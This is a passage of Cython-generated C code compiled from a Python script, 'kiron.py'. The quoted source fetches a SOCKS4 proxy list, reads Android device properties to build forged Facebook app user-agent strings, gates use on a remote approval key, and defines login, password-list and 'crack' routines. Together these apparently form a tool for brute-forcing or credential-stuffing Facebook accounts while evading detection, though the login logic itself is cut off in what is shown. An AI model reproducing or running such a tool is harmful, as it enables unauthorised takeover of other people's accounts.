  /* "kiron.py":53
 *  else:redmi.append(se)
 * try:
 *   proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text             # <<<<<<<<<<<<<<
 *   open('socksku.txt','w').write(proxylist)
 * except Exception as e:
 */
  __pyx_tuple__109 = PyTuple_Pack(1, __pyx_kp_s_https_api_proxyscrape_com_v2_req); if (unlikely(!__pyx_tuple__109)) __PYX_ERR(0, 53, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__109);
  __Pyx_GIVEREF(__pyx_tuple__109);

  /* "kiron.py":54
 * try:
 *   proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 *   open('socksku.txt','w').write(proxylist)             # <<<<<<<<<<<<<<
 * except Exception as e:
 *   print('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m server error')
 */
  __pyx_tuple__110 = PyTuple_Pack(2, __pyx_kp_s_socksku_txt, __pyx_n_s_w); if (unlikely(!__pyx_tuple__110)) __PYX_ERR(0, 54, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__110);
  __Pyx_GIVEREF(__pyx_tuple__110);

  /* "kiron.py":56
 *   open('socksku.txt','w').write(proxylist)
 * except Exception as e:
 *   print('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m server error')             # <<<<<<<<<<<<<<
 * proxsi=open('socksku.txt','r').read().splitlines()
 * #__________________[ date ]__________________#
 */
  __pyx_tuple__111 = PyTuple_Pack(1, __pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_19); if (unlikely(!__pyx_tuple__111)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__111);
  __Pyx_GIVEREF(__pyx_tuple__111);

  /* "kiron.py":57
 * except Exception as e:
 *   print('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m server error')
 * proxsi=open('socksku.txt','r').read().splitlines()             # <<<<<<<<<<<<<<
 * #__________________[ date ]__________________#
 * dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 */
  __pyx_tuple__112 = PyTuple_Pack(2, __pyx_kp_s_socksku_txt, __pyx_n_s_r); if (unlikely(!__pyx_tuple__112)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__112);
  __Pyx_GIVEREF(__pyx_tuple__112);

  /* "kiron.py":74
 * #__________________| ETC |__________________#
 * sim_id = ''
 * android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
 * build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
 */
  __pyx_tuple__113 = PyTuple_Pack(1, __pyx_kp_s_getprop_ro_build_version_release); if (unlikely(!__pyx_tuple__113)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__113);
  __Pyx_GIVEREF(__pyx_tuple__113);
  __pyx_tuple__114 = PyTuple_Pack(1, __pyx_kp_s_utf_8); if (unlikely(!__pyx_tuple__114)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__114);
  __Pyx_GIVEREF(__pyx_tuple__114);
  __pyx_tuple__115 = PyTuple_Pack(2, __pyx_kp_s__33, __pyx_kp_s__63); if (unlikely(!__pyx_tuple__115)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__115);
  __Pyx_GIVEREF(__pyx_tuple__115);

  /* "kiron.py":75
 * sim_id = ''
 * android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 * model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
 * fblc = 'en_GB'
 */
  __pyx_tuple__116 = PyTuple_Pack(1, __pyx_kp_s_getprop_ro_product_model); if (unlikely(!__pyx_tuple__116)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__116);
  __Pyx_GIVEREF(__pyx_tuple__116);

  /* "kiron.py":76
 * android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 * model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
 * build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * fblc = 'en_GB'
 * try:
 */
  __pyx_tuple__117 = PyTuple_Pack(1, __pyx_kp_s_getprop_ro_build_id); if (unlikely(!__pyx_tuple__117)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__117);
  __Pyx_GIVEREF(__pyx_tuple__117);

  /* "kiron.py":79
 * fblc = 'en_GB'
 * try:
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')             # <<<<<<<<<<<<<<
 * except:
 *         fbcr = 'Zong'
 */
  __pyx_tuple__118 = PyTuple_Pack(1, __pyx_kp_s_getprop_gsm_operator_alpha); if (unlikely(!__pyx_tuple__118)) __PYX_ERR(0, 79, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__118);
  __Pyx_GIVEREF(__pyx_tuple__118);
  __pyx_tuple__120 = PyTuple_Pack(1, __pyx_kp_s__119); if (unlikely(!__pyx_tuple__120)) __PYX_ERR(0, 79, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__120);
  __Pyx_GIVEREF(__pyx_tuple__120);

  /* "kiron.py":82
 * except:
 *         fbcr = 'Zong'
 * fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
 * fbdv = model
 */
  __pyx_tuple__121 = PyTuple_Pack(1, __pyx_kp_s_getprop_ro_product_manufacturer); if (unlikely(!__pyx_tuple__121)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__121);
  __Pyx_GIVEREF(__pyx_tuple__121);

  /* "kiron.py":83
 *         fbcr = 'Zong'
 * fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
 * fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * fbdv = model
 * fbsv = android_version
 */
  __pyx_tuple__122 = PyTuple_Pack(1, __pyx_kp_s_getprop_ro_product_brand); if (unlikely(!__pyx_tuple__122)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__122);
  __Pyx_GIVEREF(__pyx_tuple__122);

  /* "kiron.py":86
 * fbdv = model
 * fbsv = android_version
 * fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')             # <<<<<<<<<<<<<<
 * fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
 * try:
 */
  __pyx_tuple__123 = PyTuple_Pack(1, __pyx_kp_s_getprop_ro_product_cpu_abilist); if (unlikely(!__pyx_tuple__123)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__123);
  __Pyx_GIVEREF(__pyx_tuple__123);
  __pyx_tuple__125 = PyTuple_Pack(2, __pyx_kp_s__119, __pyx_kp_s__124); if (unlikely(!__pyx_tuple__125)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__125);
  __Pyx_GIVEREF(__pyx_tuple__125);

  /* "kiron.py":87
 * fbsv = android_version
 * fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
 * fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')             # <<<<<<<<<<<<<<
 * try:
 *         fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
 */
  __pyx_tuple__126 = PyTuple_Pack(1, __pyx_kp_s_getprop_ro_hwui_text_large_cache); if (unlikely(!__pyx_tuple__126)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__126);
  __Pyx_GIVEREF(__pyx_tuple__126);
  __pyx_tuple__127 = PyTuple_Pack(1, __pyx_kp_s_getprop_ro_hwui_text_large_cache_2); if (unlikely(!__pyx_tuple__127)) __PYX_ERR(0, 87, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__127);
  __Pyx_GIVEREF(__pyx_tuple__127);

  /* "kiron.py":93
 *         for i in fbcr:
 *                 total+=1
 *         select = ('1','2')             # <<<<<<<<<<<<<<
 *         if select == '1':
 *                 fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
 */
  __pyx_tuple__128 = PyTuple_Pack(2, __pyx_kp_s_1, __pyx_kp_s_2); if (unlikely(!__pyx_tuple__128)) __PYX_ERR(0, 93, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__128);
  __Pyx_GIVEREF(__pyx_tuple__128);

  /* "kiron.py":121
 *         'fbdm':fbdm}
 * #__________________[ FOLDER ]__________________#
 * try:os.mkdir('/sdcard/AYYUB')             # <<<<<<<<<<<<<<
 * except:pass
 * #__________________| LOOP |__________________#
 */
  __pyx_tuple__129 = PyTuple_Pack(1, __pyx_kp_s_sdcard_AYYUB); if (unlikely(!__pyx_tuple__129)) __PYX_ERR(0, 121, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__129);
  __Pyx_GIVEREF(__pyx_tuple__129);

  /* "kiron.py":126
 * loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];plist = [];user = []
 * #__________________[ SYS ]__________________#
 * sys.stdout.write('\x1b]2; ~AYYUB~\x07')             # <<<<<<<<<<<<<<
 * #__________________| COLOUR |__________________#
 * A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
 */
  __pyx_tuple__130 = PyTuple_Pack(1, __pyx_kp_s_2_AYYUB); if (unlikely(!__pyx_tuple__130)) __PYX_ERR(0, 126, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__130);
  __Pyx_GIVEREF(__pyx_tuple__130);

  /* "kiron.py":130
 * A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
 * #__________________| LINE |__________________#
 * def clear():os.system('clear');print(logo)             # <<<<<<<<<<<<<<
 * def linex():print(f'\x1b[1;97m\033[1;37m')
 * #__________________[ M1 ]__________________#
 */
  __pyx_codeobj__131 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_clear, 130, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__131)) __PYX_ERR(0, 130, __pyx_L1_error)

  /* "kiron.py":131
 * #__________________| LINE |__________________#
 * def clear():os.system('clear');print(logo)
 * def linex():print(f'\x1b[1;97m\033[1;37m')             # <<<<<<<<<<<<<<
 * #__________________[ M1 ]__________________#
 * def AYYUB_M1():
 */
  __pyx_codeobj__132 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_linex, 131, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__132)) __PYX_ERR(0, 131, __pyx_L1_error)

  /* "kiron.py":133
 * def linex():print(f'\x1b[1;97m\033[1;37m')
 * #__________________[ M1 ]__________________#
 * def AYYUB_M1():             # <<<<<<<<<<<<<<
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M1803E1A;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
 *         return ua
 */
  __pyx_tuple__133 = PyTuple_Pack(1, __pyx_n_s_ua); if (unlikely(!__pyx_tuple__133)) __PYX_ERR(0, 133, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__133);
  __Pyx_GIVEREF(__pyx_tuple__133);
  __pyx_codeobj__134 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__133, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_AYYUB_M1, 133, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__134)) __PYX_ERR(0, 133, __pyx_L1_error)

  /* "kiron.py":137
 *         return ua
 * #__________________[ M2 ]__________________#
 * def AYYUB_M2():             # <<<<<<<<<<<<<<
 *         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ZS630KL;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]"
 *         return ua
 */
  __pyx_codeobj__135 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__133, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_AYYUB_M2, 137, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__135)) __PYX_ERR(0, 137, __pyx_L1_error)

  /* "kiron.py":142
 * #-----------------------[ UA-CODE ]-----------------------#
 * #old ua def[]
 * def windows():             # <<<<<<<<<<<<<<
 *     aV=str(random.choice(range(10,20)))
 *     A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
 */
  __pyx_tuple__136 = PyTuple_Pack(11, __pyx_n_s_aV, __pyx_n_s_A, __pyx_n_s_bV, __pyx_n_s_bx, __pyx_n_s_bz, __pyx_n_s_B, __pyx_n_s_cV, __pyx_n_s_cx, __pyx_n_s_cz, __pyx_n_s_C, __pyx_n_s_D); if (unlikely(!__pyx_tuple__136)) __PYX_ERR(0, 142, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__136);
  __Pyx_GIVEREF(__pyx_tuple__136);
  __pyx_codeobj__137 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__136, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_windows, 142, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__137)) __PYX_ERR(0, 142, __pyx_L1_error)

  /* "kiron.py":158
 * import os,httpx
 * sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 * def approval():             # <<<<<<<<<<<<<<
 *     sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 *     ress=httpx.get("https://fgsrsvb.blogspot.com/2024/05/approvetxt.html").text
 */
  __pyx_tuple__138 = PyTuple_Pack(3, __pyx_n_s_sexkey, __pyx_n_s_ress, __pyx_n_s_tks); if (unlikely(!__pyx_tuple__138)) __PYX_ERR(0, 158, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__138);
  __Pyx_GIVEREF(__pyx_tuple__138);
  __pyx_codeobj__139 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 3, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__138, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_approval, 158, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__139)) __PYX_ERR(0, 158, __pyx_L1_error)

  /* "kiron.py":187
 * """)
 * #-----------------------[ OLD-CODE ]-----------------------#
 * def _old_():             # <<<<<<<<<<<<<<
 *        user=[]
 *        clear()
 */
  __pyx_tuple__140 = PyTuple_Pack(9, __pyx_n_s_user, __pyx_n_s_limit, __pyx_n_s_ask, __pyx_n_s_star, __pyx_n_s_i, __pyx_n_s_data, __pyx_n_s_crack_submit, __pyx_n_s_mal, __pyx_n_s_uid); if (unlikely(!__pyx_tuple__140)) __PYX_ERR(0, 187, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__140);
  __Pyx_GIVEREF(__pyx_tuple__140);
  __pyx_codeobj__141 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 9, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__140, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_old, 187, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__141)) __PYX_ERR(0, 187, __pyx_L1_error)

  /* "kiron.py":220
 * cps=[]
 * 
 * def login(uid):             # <<<<<<<<<<<<<<
 *     global oks,loop
 *     Session=requests.session()
 */
  __pyx_tuple__142 = PyTuple_Pack(5, __pyx_n_s_uid, __pyx_n_s_Session, __pyx_n_s_pw, __pyx_n_s_headers, __pyx_n_s_rp); if (unlikely(!__pyx_tuple__142)) __PYX_ERR(0, 220, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__142);
  __Pyx_GIVEREF(__pyx_tuple__142);
  __pyx_codeobj__143 = (PyObject*)__Pyx_PyCode_New(1, 0, 0, 5, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__142, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_login, 220, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__143)) __PYX_ERR(0, 220, __pyx_L1_error)

  /* "kiron.py":256
 *     except:pass
 * #__________________| MAIN |__________________#
 * def menu():             # <<<<<<<<<<<<<<
 *         try:
 *                         clear()
 */
  __pyx_tuple__144 = PyTuple_Pack(13, __pyx_n_s_xd, __pyx_n_s_file, __pyx_n_s_fo, __pyx_n_s_mthd, __pyx_n_s_ps_limit, __pyx_n_s_i, __pyx_n_s_cx, __pyx_n_s_crack_submit, __pyx_n_s_total_ids, __pyx_n_s_user, __pyx_n_s_ids, __pyx_n_s_names, __pyx_n_s_passlist); if (unlikely(!__pyx_tuple__144)) __PYX_ERR(0, 256, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__144);
  __Pyx_GIVEREF(__pyx_tuple__144);
  __pyx_codeobj__145 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 13, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__144, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_menu, 256, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__145)) __PYX_ERR(0, 256, __pyx_L1_error)

  /* "kiron.py":331
 *                 exit()
 * #__________________[ RANDOM ]__________________#
 * resrr = requests.get('https://raw.githubusercontent.com/SHISHIR-143/R/main/mix.txt').text             # <<<<<<<<<<<<<<
 * #resrr=open('/storage/emulated/0/mix.txt','r').read()
 * open('.mod.txt','w').write(resrr)
 */
  __pyx_tuple__146 = PyTuple_Pack(1, __pyx_kp_s_https_raw_githubusercontent_com); if (unlikely(!__pyx_tuple__146)) __PYX_ERR(0, 331, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__146);
  __Pyx_GIVEREF(__pyx_tuple__146);

  /* "kiron.py":333
 * resrr = requests.get('https://raw.githubusercontent.com/SHISHIR-143/R/main/mix.txt').text
 * #resrr=open('/storage/emulated/0/mix.txt','r').read()
 * open('.mod.txt','w').write(resrr)             # <<<<<<<<<<<<<<
 * moe = open('.mod.txt','r').read().splitlines()
 * def usergent():
 */
  __pyx_tuple__147 = PyTuple_Pack(2, __pyx_kp_s_mod_txt, __pyx_n_s_w); if (unlikely(!__pyx_tuple__147)) __PYX_ERR(0, 333, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__147);
  __Pyx_GIVEREF(__pyx_tuple__147);

  /* "kiron.py":334
 * #resrr=open('/storage/emulated/0/mix.txt','r').read()
 * open('.mod.txt','w').write(resrr)
 * moe = open('.mod.txt','r').read().splitlines()             # <<<<<<<<<<<<<<
 * def usergent():
 *      motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
 */
  __pyx_tuple__148 = PyTuple_Pack(2, __pyx_kp_s_mod_txt, __pyx_n_s_r); if (unlikely(!__pyx_tuple__148)) __PYX_ERR(0, 334, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__148);
  __Pyx_GIVEREF(__pyx_tuple__148);

  /* "kiron.py":335
 * open('.mod.txt','w').write(resrr)
 * moe = open('.mod.txt','r').read().splitlines()
 * def usergent():             # <<<<<<<<<<<<<<
 *      motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
 *      mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
 */
